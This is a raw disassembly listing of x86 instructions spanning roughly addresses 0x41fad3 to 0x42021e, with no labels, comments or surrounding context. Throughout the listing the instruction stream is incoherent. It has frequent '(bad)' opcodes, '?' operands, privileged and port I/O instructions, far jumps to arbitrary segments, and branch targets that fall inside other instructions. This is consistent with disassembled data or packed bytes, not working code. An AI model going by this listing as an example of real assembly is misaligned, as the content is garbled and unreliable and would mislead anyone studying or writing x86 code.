  41fad3:	addr16 mov edi,0x6aa3dff3
  41fad9:	xchg   edx,eax
  41fada:	and    al,0x33
  41fadc:	lds    edx,FWORD PTR [ecx+0x3df52207]
  41fae2:	rcl    BYTE PTR [ebx+ebp*1-0x32],cl
  41fae6:	dec    ecx
  41fae7:	out    dx,eax
  41fae8:	jg     0x41faad
  41faea:	pop    edx
  41faeb:	je     0x41fb55
  41faed:	ds jbe 0x41fb3e
  41faf0:	in     eax,dx
  41faf1:	lock pusha 
  41faf3:	in     eax,0x6
  41faf5:	rcr    DWORD PTR [ecx-0x4208a287],0x79
  41fafc:	in     al,0x14
  41fafe:	stc    
  41faff:	repz fs push edi
  41fb02:	mov    bh,0x75
  41fb04:	inc    eax
  41fb05:	dec    esp
  41fb06:	pusha  
  41fb07:	inc    ebx
  41fb08:	lahf   
  41fb09:	jecxz  0x41fb56
  41fb0b:	popf   
  41fb0c:	int3   
  41fb0d:	lods   al,BYTE PTR ds:[esi]
  41fb0e:	pop    eax
  41fb0f:	xchg   DWORD PTR ds:0x90643ab8,edi
  41fb15:	sub    BYTE PTR [ebx],0x48
  41fb18:	dec    ebx
  41fb19:	or     al,BYTE PTR [ecx-0x5e46a838]
  41fb1f:	pop    edx
  41fb20:	(bad)  
  41fb21:	addr16 fwait
  41fb23:	stos   BYTE PTR es:[edi],al
  41fb24:	in     al,0xbd
  41fb26:	out    0xe,eax
  41fb28:	xchg   esi,eax
  41fb29:	outs   dx,DWORD PTR ds:[esi]
  41fb2a:	mov    ?,edi
  41fb2c:	aaa    
  41fb2d:	mov    ebx,0xe19f80c8
  41fb32:	fs in  eax,dx
  41fb34:	mov    cl,0x7f
  41fb36:	pop    edx
  41fb37:	dec    esi
  41fb38:	pop    ecx
  41fb39:	or     al,0xe5
  41fb3b:	jne    0x41fb63
  41fb3d:	sub    esp,eax
  41fb3f:	outs   dx,BYTE PTR ds:[esi]
  41fb40:	jno    0x41fb8d
  41fb42:	idiv   BYTE PTR [esi]
  41fb44:	and    BYTE PTR [ebp+0x28],bh
  41fb47:	lods   al,BYTE PTR ds:[esi]
  41fb48:	stos   BYTE PTR es:[edi],al
  41fb49:	mov    dh,0x5f
  41fb4b:	pusha  
  41fb4c:	sbb    al,0x61
  41fb4e:	or     al,0x6f
  41fb50:	jo     0x41fb74
  41fb52:	add    al,BYTE PTR [eax+0x56]
  41fb55:	in     al,dx
  41fb56:	mov    bh,0x6a
  41fb58:	scas   eax,DWORD PTR es:[edi]
  41fb59:	cld    
  41fb5a:	nop
  41fb5b:	rcl    BYTE PTR [ecx+0x3eae36b2],0xc9
  41fb62:	pop    esp
  41fb63:	mov    eax,0x6577024c
  41fb68:	sub    DWORD PTR [edx+0x188f7aff],ecx
  41fb6e:	jae    0x41fb62
  41fb70:	add    al,0xe5
  41fb72:	aam    0x17
  41fb74:	into   
  41fb75:	mov    gs,esp
  41fb77:	daa    
  41fb78:	(bad)  
  41fb79:	int    0x77
  41fb7b:	xor    DWORD PTR [esi+0x54],esp
  41fb7e:	pop    ss
  41fb7f:	jbe    0x41fb17
  41fb81:	jecxz  0x41fbee
  41fb83:	sub    ebx,ecx
  41fb85:	push   eax
  41fb86:	stc    
  41fb87:	rol    DWORD PTR [edi-0x1aa72afe],cl
  41fb8d:	inc    bl
  41fb8f:	mov    edi,0xfbce33f1
  41fb94:	repz scas al,BYTE PTR es:[edi]
  41fb96:	sbb    al,0x67
  41fb98:	xor    DWORD PTR [edx+0x775a4f0a],ebx
  41fb9e:	and    DWORD PTR [edi+0x13],eax
  41fba1:	and    eax,0x993d617e
  41fba6:	cmp    BYTE PTR [edx],ah
  41fba8:	or     al,0xe1
  41fbaa:	push   edx
  41fbab:	jge    0x41fb4d
  41fbad:	inc    edi
  41fbae:	(bad)  
  41fbaf:	outs   dx,DWORD PTR ds:[esi]
  41fbb0:	(bad)  
  41fbb1:	std    
  41fbb2:	push   eax
  41fbb3:	push   ds
  41fbb4:	push   ss
  41fbb5:	cli    
  41fbb6:	mov    edx,0x9d6d6b4f
  41fbbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbbc:	inc    edx
  41fbbd:	ss jmp 0x77ef:0x480000eb
  41fbc5:	imul   esi,edi,0xfffffffb
  41fbc8:	pop    esp
  41fbc9:	out    dx,eax
  41fbca:	dec    esp
  41fbcb:	mul    BYTE PTR [esi-0x7d]
  41fbce:	jae    0x41fb88
  41fbd0:	cld    
  41fbd1:	stc    
  41fbd2:	sahf   
  41fbd3:	jno    0x41fbd6
  41fbd5:	add    BYTE PTR [esi],ah
  41fbd7:	add    eax,DWORD PTR [eax]
  41fbd9:	add    BYTE PTR [eax],dh
  41fbdb:	jmp    0x41fb92
  41fbdd:	int3   
  41fbde:	cmp    bl,BYTE PTR [esi+eiz*2-0x2a5b454f]
  41fbe5:	shl    DWORD PTR [eax-0x3a2d381b],1
  41fbeb:	(bad)  
  41fbec:	pop    ebx
  41fbed:	fisttp DWORD PTR [ebx+0x26]
  41fbf0:	lahf   
  41fbf1:	lea    ebx,[ecx+0x74]
  41fbf4:	add    eax,0x814e8f4c
  41fbf9:	ja     0x41fbc6
  41fbfb:	and    dh,BYTE PTR [ebp+0x68269136]
  41fc01:	and    esp,ebp
  41fc03:	cli    
  41fc04:	(bad)  
  41fc05:	in     al,0x10
  41fc07:	cmp    eax,0xe8a7c217
  41fc0c:	out    dx,eax
  41fc0d:	or     BYTE PTR [edx+0x6],ch
  41fc10:	add    al,0x31
  41fc12:	xor    dl,0xc1
  41fc15:	jle    0x41fc73
  41fc17:	inc    ebx
  41fc18:	dec    esi
  41fc19:	and    ebx,esp
  41fc1b:	enter  0xc9bd,0x37
  41fc1f:	std    
  41fc20:	dec    eax
  41fc21:	mov    esp,esp
  41fc23:	or     al,0xff
  41fc25:	rol    BYTE PTR [ebx+eiz*1-0x79],cl
  41fc29:	lock hlt 
  41fc2b:	fisttp QWORD PTR [eax-0x5]
  41fc2e:	push   0x96e945a3
  41fc33:	out    0xf5,eax
  41fc35:	add    DWORD PTR [esi],eax
  41fc37:	fwait
  41fc38:	xchg   ecx,eax
  41fc39:	sub    edi,DWORD PTR [edi+0x69]
  41fc3c:	dec    esp
  41fc3d:	and    BYTE PTR [ebp-0x1303d869],dh
  41fc43:	leave  
  41fc44:	mov    bl,BYTE PTR [ebx+edx*1]
  41fc47:	lahf   
  41fc48:	fld    QWORD PTR [edx]
  41fc4a:	xchg   esi,eax
  41fc4b:	add    dh,al
  41fc4d:	mov    ebp,0x9a2b379b
  41fc52:	outs   dx,DWORD PTR ds:[esi]
  41fc53:	js     0x41fc0d
  41fc55:	adc    DWORD PTR [edi+0xa],ecx
  41fc58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc59:	adc    ecx,DWORD PTR [ebx-0x73]
  41fc5c:	pop    ecx
  41fc5d:	cs adc bh,cl
  41fc60:	push   edi
  41fc61:	xor    bl,BYTE PTR [ecx]
  41fc63:	jb     0x41fc03
  41fc65:	inc    edx
  41fc66:	test   BYTE PTR [edx+eiz*1],bl
  41fc69:	test   DWORD PTR [eax],esi
  41fc6b:	idiv   DWORD PTR [eax-0x5ae2e101]
  41fc71:	pop    edx
  41fc72:	mov    bh,0x62
  41fc74:	pop    ecx
  41fc75:	or     esp,edx
  41fc77:	cmp    eax,0x408bf581
  41fc7c:	cmp    eax,0x2b735465
  41fc81:	stc    
  41fc82:	jne    0x41fc1c
  41fc84:	sar    DWORD PTR ds:0x7513dd39,cl
  41fc8a:	aam    0x3d
  41fc8c:	aas    
  41fc8d:	add    eax,0x817a2ba4
  41fc92:	pop    es
  41fc93:	sbb    bl,BYTE PTR [eax-0x6781975d]
  41fc99:	shl    edi,1
  41fc9b:	xlat   BYTE PTR cs:[ebx]
  41fc9d:	mov    ds:0xf5886a2a,al
  41fca2:	daa    
  41fca3:	inc    ebp
  41fca4:	sub    ebp,DWORD PTR [eax+0x29]
  41fca7:	lock sti 
  41fca9:	and    ebx,DWORD PTR [eax-0x73]
  41fcac:	sbb    bh,BYTE PTR [eax]
  41fcae:	repz add eax,0xc3f48138
  41fcb4:	cdq    
  41fcb5:	inc    eax
  41fcb6:	out    dx,al
  41fcb7:	push   edi
  41fcb8:	jns    0x41fcd7
  41fcba:	fwait
  41fcbb:	push   ss
  41fcbc:	add    BYTE PTR [edi],ah
  41fcbe:	push   ebp
  41fcbf:	adc    eax,0xc66b7a6d
  41fcc4:	jnp    0x41fd40
  41fcc6:	jp     0x41fcf6
  41fcc8:	dec    edx
  41fcc9:	cmp    al,0xfa
  41fccb:	pop    eax
  41fccc:	leave  
  41fccd:	sub    ecx,ebp
  41fccf:	daa    
  41fcd0:	gs pusha 
  41fcd2:	outs   dx,BYTE PTR ds:[esi]
  41fcd3:	je     0x41fc9a
  41fcd5:	push   0x9135dd65
  41fcda:	dec    esi
  41fcdb:	cmp    eax,0xffffffde
  41fcde:	sbb    eax,0xf5061c20
  41fce3:	inc    edi
  41fce4:	jp     0x41fd56
  41fce6:	sub    bh,BYTE PTR [ebp-0x7b289768]
  41fcec:	pop    ds
  41fced:	ret    
  41fcee:	push   esi
  41fcef:	and    al,0xc3
  41fcf1:	fdiv   DWORD PTR [edi+0x67]
  41fcf4:	pusha  
  41fcf5:	and    BYTE PTR [edx-0x537771d3],ch
  41fcfb:	loope  0x41fce4
  41fcfd:	push   cs
  41fcfe:	pop    ecx
  41fcff:	pusha  
  41fd00:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41fd02:	cli    
  41fd03:	(bad)
  41fd07:	inc    ebp
  41fd08:	mov    al,ds:0x4d15b834
  41fd0d:	out    dx,eax
  41fd0e:	icebp  
  41fd0f:	cwde   
  41fd10:	dec    ecx
  41fd11:	push   ebx
  41fd12:	popf   
  41fd13:	or     ebp,esp
  41fd15:	sbb    ecx,ecx
  41fd17:	dec    edx
  41fd18:	cmp    eax,0xa0ce235b
  41fd1d:	iret   
  41fd1e:	add    ebx,DWORD PTR gs:[ecx+eax*2+0x555fd707]
  41fd26:	inc    ebx
  41fd27:	arpl   WORD PTR [esi-0x1a0b574c],si
  41fd2d:	ret    0x1e43
  41fd30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd31:	add    al,0x37
  41fd33:	rcl    dl,1
  41fd35:	mov    edx,0xe8f282b1
  41fd3a:	xchg   ebp,eax
  41fd3b:	pop    ds
  41fd3c:	call   0x8f37:0xece1683e
  41fd43:	dec    esi
  41fd44:	not    esp
  41fd46:	push   ecx
  41fd47:	sbb    BYTE PTR [eax-0x12],0xc8
  41fd4b:	pop    edi
  41fd4c:	rsm    
  41fd4e:	xchg   ebp,eax
  41fd4f:	test   DWORD PTR [ebp+0x33],esp
  41fd52:	cmp    BYTE PTR ss:[edi+eax*8],bl
  41fd56:	test   BYTE PTR [esi],0xdb
  41fd59:	outs   dx,BYTE PTR ds:[esi]
  41fd5a:	xor    eax,0x264abd7f
  41fd5f:	fld    TBYTE PTR [esp+ecx*2+0x37]
  41fd63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd64:	daa    
  41fd65:	ins    BYTE PTR es:[edi],dx
  41fd66:	mov    al,ds:0x261a0bcc
  41fd6b:	retf   0xadad
  41fd6e:	push   eax
  41fd6f:	(bad)  
  41fd70:	add    bh,BYTE PTR [edx-0x18]
  41fd73:	stc    
  41fd74:	iret   
  41fd75:	or     ecx,edx
  41fd77:	add    DWORD PTR ds:0x727f3031,eax
  41fd7d:	jb     0x41fd01
  41fd7f:	in     al,dx
  41fd80:	cmp    al,0x39
  41fd82:	mov    BYTE PTR [ecx],dh
  41fd84:	shr    esp,0x23
  41fd87:	pop    ebp
  41fd88:	jo     0x41fd92
  41fd8a:	and    DWORD PTR [ebx-0x355ffda1],eax
  41fd90:	fstp   st(1)
  41fd92:	cli    
  41fd93:	bound  esp,QWORD PTR [ecx+ecx*8-0x4e]
  41fd97:	xor    esp,DWORD PTR [edi]
  41fd99:	ret    
  41fd9a:	fst    st(4)
  41fd9c:	aaa    
  41fd9d:	das    
  41fd9e:	jle    0x41fd74
  41fda0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fda1:	test   BYTE PTR [esi-0x15],dl
  41fda4:	push   esi
  41fda5:	fsub   DWORD PTR [edx+0x44f94e60]
  41fdab:	mov    eax,ds:0xfc9c614f
  41fdb0:	mov    dh,0x54
  41fdb2:	pop    ds
  41fdb3:	mov    bl,0x9e
  41fdb5:	xlat   BYTE PTR ds:[ebx]
  41fdb6:	test   DWORD PTR [eax+0x6d],esp
  41fdb9:	jbe    0x41fd87
  41fdbb:	pop    esp
  41fdbc:	out    0x12,eax
  41fdbe:	and    al,0xf7
  41fdc0:	psraw  mm3,QWORD PTR [ebp-0x6179a089]
  41fdc7:	imul   ebp,DWORD PTR ds:0xfcb6ba96,0x5f
  41fdce:	mov    esi,0x599a076e
  41fdd3:	ins    DWORD PTR es:[edi],dx
  41fdd4:	pop    ss
  41fdd5:	aas    
  41fdd6:	lods   al,BYTE PTR ds:[esi]
  41fdd7:	iret   
  41fdd8:	mov    dl,0x47
  41fdda:	arpl   WORD PTR [eax-0x41],cx
  41fddd:	lds    esp,FWORD PTR [esi-0x170c257d]
  41fde3:	pxor   mm3,QWORD PTR [edx]
  41fde6:	lods   eax,DWORD PTR ds:[esi]
  41fde7:	shl    DWORD PTR [edx+ebp*4+0x7],cl
  41fdeb:	hlt    
  41fdec:	push   ds
  41fded:	cdq    
  41fdee:	fcmovbe st,st(4)
  41fdf0:	out    dx,al
  41fdf1:	mov    edx,0xa1e95ad4
  41fdf6:	retf   0x55a9
  41fdf9:	xor    eax,0xdf612a6d
  41fdfe:	out    dx,al
  41fdff:	in     al,0x22
  41fe01:	out    0x4e,eax
  41fe03:	das    
  41fe04:	lock mov DWORD PTR [edx+0x23],ecx
  41fe08:	imul   esp,DWORD PTR [edx+0x13],0x2662399c
  41fe0f:	scas   al,BYTE PTR es:[edi]
  41fe10:	ss mov ah,0xc9
  41fe13:	stos   BYTE PTR es:[edi],al
  41fe14:	int    0x99
  41fe16:	add    edx,esp
  41fe18:	jbe    0x41fe0e
  41fe1a:	adc    eax,0x3bc416ec
  41fe1f:	popa   
  41fe20:	cwde   
  41fe21:	imul   esi,ebp,0xffffffcf
  41fe24:	jmp    0x453b:0x572ee9b2
  41fe2b:	jle    0x41fe7f
  41fe2d:	retf   0x8625
  41fe30:	data16 jnp 0x41fe55
  41fe33:	pop    esi
  41fe34:	scas   eax,DWORD PTR es:[edi]
  41fe35:	dec    edi
  41fe36:	bound  ecx,QWORD PTR ds:0xe8027c34
  41fe3c:	xchg   esi,eax
  41fe3d:	push   0x7f
  41fe3f:	dec    ebp
  41fe40:	and    BYTE PTR [ebp-0x6],0xa9
  41fe44:	mov    ch,0xc8
  41fe46:	std    
  41fe47:	loope  0x41fe70
  41fe49:	sbb    cl,BYTE PTR [eax-0x43]
  41fe4c:	add    ebp,0x9f5ea040
  41fe52:	sbb    al,0xcf
  41fe54:	jge    0x41fe53
  41fe56:	xchg   edx,eax
  41fe57:	add    al,0x13
  41fe59:	lods   al,BYTE PTR ds:[esi]
  41fe5a:	in     eax,dx
  41fe5b:	sub    al,0x6c
  41fe5d:	add    ch,dl
  41fe5f:	fs push eax
  41fe61:	dec    eax
  41fe62:	stos   DWORD PTR es:[edi],eax
  41fe63:	adc    eax,0x99637fbe
  41fe68:	ret    0x12d4
  41fe6b:	inc    eax
  41fe6c:	test   al,0xa4
  41fe6e:	shl    BYTE PTR [ecx+ebx*1+0x5d],cl
  41fe72:	mov    al,0x45
  41fe74:	mov    esp,0xd3899963
  41fe79:	or     ch,bh
  41fe7b:	sti    
  41fe7c:	repz xor BYTE PTR [ebp-0x3b],ch
  41fe80:	in     al,dx
  41fe81:	xchg   ebx,eax
  41fe82:	lock xchg ebp,eax
  41fe84:	addr16 mov esp,0x88f735f5
  41fe8a:	repnz cmova edi,DWORD PTR [eax+0x6d5d7380]
  41fe92:	enter  0x6f9b,0xe2
  41fe96:	and    dh,BYTE PTR [ebx-0x17]
  41fe99:	push   0xbc07b993
  41fe9e:	sub    eax,0x4011d9d0
  41fea3:	sub    al,0x6c
  41fea5:	cmp    bh,bh
  41fea7:	and    eax,0x77d2b874
  41feac:	xor    dh,ah
  41feae:	push   edx
  41feaf:	mov    ds:0xdbd9fe85,eax
  41feb4:	xor    bh,BYTE PTR [ebx-0x2a]
  41feb7:	out    0xe3,eax
  41feb9:	sub    ah,al
  41febb:	dec    edx
  41febc:	cmp    al,0x1d
  41febe:	adc    eax,0xbc2065c
  41fec3:	aas    
  41fec4:	xchg   BYTE PTR ss:[edx],cl
  41fec7:	js     0x41febe
  41fec9:	cmc    
  41feca:	fwait
  41fecb:	ins    BYTE PTR es:[edi],dx
  41fecc:	sub    dh,BYTE PTR [edx+0x56]
  41fecf:	and    DWORD PTR [edx+0x21f615d0],eax
  41fed5:	jbe    0x41fe8b
  41fed7:	jge    0x41fe5c
  41fed9:	pop    esp
  41feda:	dec    eax
  41fedb:	sar    BYTE PTR [ebp+0x1c],cl
  41fede:	mov    esi,0x27910389
  41fee3:	jb     0x41fea7
  41fee5:	ja     0x41fef3
  41fee7:	jnp    0x41feb6
  41fee9:	shr    DWORD PTR [edx+0x27],1
  41feec:	push   esp
  41feed:	xor    bh,BYTE PTR [ebx-0xe3ff0d4]
  41fef3:	adc    ch,BYTE PTR [esi+edx*8+0x18]
  41fef7:	mov    eax,0xe0b25b06
  41fefc:	xchg   esp,eax
  41fefd:	cmp    al,0xcf
  41feff:	adc    eax,0xe3b00000
  41ff04:	pop    edx
  41ff05:	jecxz  0x41ff62
  41ff07:	sti    
  41ff08:	mov    ecx,0x72415ff3
  41ff0d:	test   ecx,ebx
  41ff0f:	ret    0x5c12
  41ff12:	les    esi,FWORD PTR [ecx+eax*1+0x0]
  41ff16:	add    eax,DWORD PTR es:[eax]
  41ff19:	add    ch,al
  41ff1b:	mov    ebx,0xe54d12dc
  41ff20:	cmp    bh,BYTE PTR [edx+0x52]
  41ff23:	xor    BYTE PTR [esi],dl
  41ff25:	add    BYTE PTR [ecx],al
  41ff27:	iret   
  41ff28:	mov    ecx,0x86fc4a54
  41ff2d:	in     eax,0xfc
  41ff2f:	cmp    eax,0x5fe96fdb
  41ff34:	mov    ?,WORD PTR [ecx]
  41ff36:	out    0x27,eax
  41ff38:	cmp    eax,0x988c5573
  41ff3d:	ins    DWORD PTR es:[edi],dx
  41ff3e:	jae    0x41ff3c
  41ff40:	sub    al,0x4d
  41ff42:	fwait
  41ff43:	iret   
  41ff44:	leave  
  41ff45:	cmp    al,BYTE PTR [edi+0xbc92129]
  41ff4b:	pop    edi
  41ff4c:	and    ah,BYTE PTR [ecx-0x4e1e9e1a]
  41ff52:	retf   0x72dc
  41ff55:	das    
  41ff56:	mov    eax,?
  41ff58:	mov    bh,0x90
  41ff5a:	cmp    ecx,DWORD PTR [ecx]
  41ff5c:	out    dx,al
  41ff5d:	cmp    eax,0xa47bcd3b
  41ff62:	(bad)  
  41ff63:	ss jbe 0x41ff76
  41ff66:	push   eax
  41ff67:	cli    
  41ff68:	pusha  
  41ff69:	cs popf 
  41ff6b:	jl     0x41ffd9
  41ff6d:	pop    ebx
  41ff6e:	sti    
  41ff6f:	push   ebx
  41ff70:	pop    edi
  41ff71:	or     eax,0x3a51e64f
  41ff76:	ins    DWORD PTR es:[edi],dx
  41ff77:	mov    bl,0x72
  41ff79:	inc    ebp
  41ff7a:	sbb    eax,DWORD PTR [esp+ebx*4]
  41ff7d:	pop    edi
  41ff7e:	(bad)  
  41ff7f:	mov    edi,0xb091e51e
  41ff84:	ins    BYTE PTR es:[edi],dx
  41ff85:	lods   al,BYTE PTR ds:[esi]
  41ff86:	aaa    
  41ff87:	test   esp,0x4770f7db
  41ff8d:	gs sbb eax,0x4eab4550
  41ff93:	(bad)  
  41ff94:	(bad)  
  41ff96:	cmp    bh,dh
  41ff98:	ds scas al,BYTE PTR es:[edi]
  41ff9a:	fisttp QWORD PTR [ebx+0xd7608d2]
  41ffa0:	sub    cl,BYTE PTR [esi+edx*8+0x12]
  41ffa4:	push   0x9f3d06ee
  41ffa9:	pop    ss
  41ffaa:	scas   al,BYTE PTR es:[edi]
  41ffab:	pop    ebx
  41ffac:	stc    
  41ffad:	loopne 0x41ff99
  41ffaf:	aaa    
  41ffb0:	sub    bh,0x99
  41ffb3:	dec    ebp
  41ffb4:	cmp    BYTE PTR [esi],0xa5
  41ffb7:	sub    eax,0x9607351f
  41ffbc:	or     BYTE PTR [esp+ecx*2+0x3fd637e4],cl
  41ffc3:	add    BYTE PTR [eax],ah
  41ffc5:	es push ecx
  41ffc7:	fcmovb st,st(4)
  41ffc9:	jle    0x41ff4c
  41ffcb:	adc    dl,ah
  41ffcd:	int    0x2c
  41ffcf:	jl     0x41ff62
  41ffd1:	addr16 mov bl,0xc5
  41ffd4:	and    eax,0xabf78e77
  41ffd9:	push   ecx
  41ffda:	cld    
  41ffdb:	xchg   esi,eax
  41ffdc:	outs   dx,BYTE PTR ds:[esi]
  41ffdd:	dec    esi
  41ffde:	das    
  41ffdf:	test   BYTE PTR [ebx-0x66b3f276],0x5c
  41ffe6:	aaa    
  41ffe7:	lods   al,BYTE PTR ds:[esi]
  41ffe8:	aas    
  41ffe9:	imul   edi,DWORD PTR es:[ebx-0x63ba9b55],0xffffffe8
  41fff1:	add    ebp,esp
  41fff3:	loope  0x41ff9b
  41fff5:	fld    TBYTE PTR ds:0xcd4f8119
  41fffb:	inc    ecx
  41fffc:	push   esp
  41fffd:	(bad)  
  41fffe:	jge    0x420054
  420000:	jno    0x420024
  420002:	dec    ebx
  420003:	inc    edi
  420004:	pop    eax
  420005:	or     al,0xf9
  420007:	mov    ah,bh
  420009:	xor    al,0x24
  42000b:	mov    ebx,0x1a9f7af1
  420010:	retf   
  420011:	mov    cl,0x9f
  420013:	mov    ch,BYTE PTR [ecx-0x7c]
  420016:	mov    eax,0xab639bf3
  42001b:	inc    edx
  42001c:	push   esp
  42001d:	enter  0x56e5,0x5a
  420021:	dec    ecx
  420022:	js     0x420034
  420024:	enter  0xd2c1,0x1f
  420028:	dec    esp
  420029:	sub    ecx,DWORD PTR [ebp-0x3]
  42002c:	je     0x420026
  42002e:	and    al,BYTE PTR [ebx]
  420030:	fsub   QWORD PTR [edi]
  420032:	and    al,dh
  420034:	call   0x5da74351
  420039:	xor    DWORD PTR [edi],0x8c09b8f1
  42003f:	add    bh,0x6d
  420042:	inc    esi
  420043:	fnstsw WORD PTR [eax-0x76]
  420046:	mov    edi,0x35387e93
  42004b:	sbb    DWORD PTR [edi],ebx
  42004d:	gs int 0xf9
  420050:	adc    eax,0x2a7114a5
  420055:	iret   
  420056:	mov    ebp,0x7cbca24
  42005b:	push   edx
  42005c:	push   es
  42005d:	adc    DWORD PTR [ebp+0x54ccd930],edi
  420063:	pop    ss
  420064:	lahf   
  420065:	xchg   DWORD PTR es:[esi],ebp
  420068:	cmp    edx,DWORD PTR [edi+edi*2]
  42006b:	gs ins DWORD PTR es:[edi],dx
  42006d:	inc    ecx
  42006e:	sub    edx,DWORD PTR [edi]
  420070:	popa   
  420071:	in     eax,0xef
  420073:	adc    al,0xf2
  420075:	mov    ds:0xee26276a,al
  42007a:	jo     0x42005d
  42007c:	sub    DWORD PTR [ebp*1+0x41e346f2],ebp
  420083:	cs (bad) 
  420085:	jl     0x420048
  420087:	xchg   ebx,eax
  420088:	add    al,0x67
  42008a:	mov    bl,0x38
  42008c:	push   eax
  42008d:	jmp    0x7229edea
  420092:	cdq    
  420093:	dec    ebp
  420094:	pop    ss
  420095:	das    
  420096:	sti    
  420097:	jo     0x420036
  420099:	sbb    dl,ch
  42009b:	jge    0x420065
  42009d:	fdivr  QWORD PTR ds:0xc3c49245
  4200a3:	stos   DWORD PTR es:[edi],eax
  4200a4:	sahf   
  4200a5:	loope  0x42011d
  4200a7:	inc    eax
  4200a8:	inc    ebx
  4200a9:	or     eax,0x3603363d
  4200ae:	cld    
  4200af:	lds    esp,FWORD PTR [edi-0x48]
  4200b2:	mov    esp,0x40d1b297
  4200b7:	mov    eax,0xbd71f44
  4200bc:	pop    edi
  4200bd:	pop    edx
  4200be:	sub    cl,BYTE PTR [ecx]
  4200c0:	pop    ebx
  4200c1:	and    bh,bh
  4200c3:	xchg   ebp,eax
  4200c4:	loope  0x420059
  4200c6:	lods   eax,DWORD PTR ds:[esi]
  4200c7:	or     DWORD PTR [edi+eiz*4],ebp
  4200ca:	xchg   ecx,eax
  4200cb:	xchg   ebx,eax
  4200cc:	fwait
  4200cd:	loop   0x420067
  4200cf:	pop    edx
  4200d0:	(bad)  
  4200d1:	cmp    dl,BYTE PTR [edi-0x4b45a826]
  4200d7:	loope  0x42005c
  4200d9:	add    dh,BYTE PTR [eax-0xc]
  4200dc:	mov    al,ds:0x1afdb830
  4200e1:	mov    bl,0xbe
  4200e3:	mov    ch,0xf
  4200e5:	daa    
  4200e6:	imul   ebp,ebp,0xffffff9d
  4200e9:	mov    esp,0x99e582c5
  4200ee:	jmp    0x4200d0
  4200f0:	jg     0x420101
  4200f2:	xchg   ecx,eax
  4200f3:	pop    ebx
  4200f4:	lods   al,BYTE PTR ds:[esi]
  4200f5:	push   ecx
  4200f6:	add    eax,DWORD PTR [edx-0x5e]
  4200f9:	mov    al,ds:0x78c888f8
  4200fe:	jg     0x420111
  420100:	jnp    0x4200a9
  420102:	cmp    al,0x3b
  420104:	les    eax,FWORD PTR [ecx-0x5f2c4e7f]
  42010a:	sbb    eax,0x93857814
  42010f:	jg     0x4200a8
  420111:	and    DWORD PTR [esi+0xd38514c],ebp
  420117:	lea    edx,[ebp-0x22]
  42011a:	mov    DWORD PTR [eax+0xa],eax
  42011d:	int    0xce
  42011f:	sub    cl,BYTE PTR [edx]
  420121:	icebp  
  420122:	dec    eax
  420123:	lea    esp,[edi-0x731bf4ff]
  420129:	test   BYTE PTR [edi-0x75],ah
  42012c:	jb     0x420102
  42012e:	adc    BYTE PTR [ecx+0x5d587fc7],ch
  420134:	sbb    bh,BYTE PTR [ecx+0x6822a047]
  42013a:	sub    BYTE PTR [edx],bh
  42013c:	jbe    0x4200f7
  42013e:	mov    esi,fs
  420140:	ret    
  420141:	(bad)  
  420142:	std    
  420143:	int3   
  420144:	jnp    0x42015f
  420146:	in     eax,0xc5
  420148:	sub    BYTE PTR [ecx+0x40],dl
  42014b:	lea    esi,[ebp-0x5a]
  42014e:	xchg   ebx,eax
  42014f:	sub    cl,BYTE PTR [ecx]
  420151:	jno    0x4201a0
  420153:	sti    
  420154:	cmc    
  420155:	ds and ah,al
  420158:	icebp  
  420159:	(bad)  
  42015b:	add    eax,0x82015da7
  420160:	and    DWORD PTR [ecx+0x4],esp
  420163:	xchg   edi,eax
  420164:	imul   eax,DWORD PTR [esi-0x68],0xfffffff6
  420168:	ds lahf 
  42016a:	adc    eax,DWORD PTR [edx]
  42016c:	nop
  42016d:	jbe    0x42017d
  42016f:	out    dx,al
  420170:	les    esi,FWORD PTR [esi-0x745544a6]
  420176:	sbb    eax,0x72ad4949
  42017b:	push   esi
  42017c:	pop    ds
  42017d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42017e:	inc    ecx
  42017f:	sar    BYTE PTR [ebx],1
  420181:	cwde   
  420182:	xchg   ecx,eax
  420183:	test   DWORD PTR [edx],ecx
  420185:	pusha  
  420186:	out    dx,eax
  420187:	push   0xc97c5964
  42018c:	push   eax
  42018d:	adc    eax,0x91f7d6fe
  420192:	test   al,0x84
  420194:	mov    BYTE PTR [ecx],cl
  420196:	test   dl,bh
  420198:	(bad)  
  420199:	fnstsw WORD PTR [ebx]
  42019b:	push   cs
  42019c:	pop    ss
  42019d:	or     ah,bh
  42019f:	(bad)  
  4201a0:	retf   0xcb53
  4201a3:	aad    0x5
  4201a5:	jb     0x42016f
  4201a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201a8:	adc    dl,bh
  4201aa:	xchg   esi,eax
  4201ab:	cmp    al,0xb1
  4201ad:	dec    edx
  4201ae:	daa    
  4201af:	dec    eax
  4201b0:	(bad)
  4201b3:	out    0x49,eax
  4201b5:	jno    0x420171
  4201b7:	xchg   edx,eax
  4201b8:	adc    ebp,DWORD PTR [ebx+0x1718230e]
  4201be:	add    cl,BYTE PTR [edx-0x72889c14]
  4201c4:	inc    ebp
  4201c5:	cmp    DWORD PTR [edx+0x5c0ca3e4],0x8971f887
  4201cf:	mov    al,BYTE PTR [edx]
  4201d1:	jmp    0x420209
  4201d3:	stos   BYTE PTR es:[edi],al
  4201d4:	(bad)  
  4201d5:	rol    BYTE PTR [ebp+eax*1+0x283041b8],0xa3
  4201dd:	mov    ebp,0x8e14d7f3
  4201e2:	cld    
  4201e3:	out    dx,eax
  4201e4:	fcomp  DWORD PTR [ebx+0x7b]
  4201e7:	fnstsw WORD PTR [ebx-0x771cb1d]
  4201ed:	xchg   ebx,eax
  4201ee:	mov    edi,0xc38dfa41
  4201f3:	pop    edi
  4201f4:	mov    ds:0x2144f2ac,eax
  4201f9:	inc    edi
  4201fa:	into   
  4201fb:	aam    0xd2
  4201fd:	(bad)  
  4201fe:	loop   0x420244
  420200:	in     al,0x51
  420202:	imul   esi,DWORD PTR ds:[esi-0x5aa29baf],0x98a8f769
  42020d:	add    eax,0x12eda378
  420212:	mov    cl,0xdb
  420214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420215:	es repz scas al,BYTE PTR es:[edi]
  420218:	std    
  420219:	retf   
  42021a:	add    al,0x9d
  42021c:	in     eax,0xbd
  42021e:	imul   esp,DWORD PTR [edi-0x28],0x62
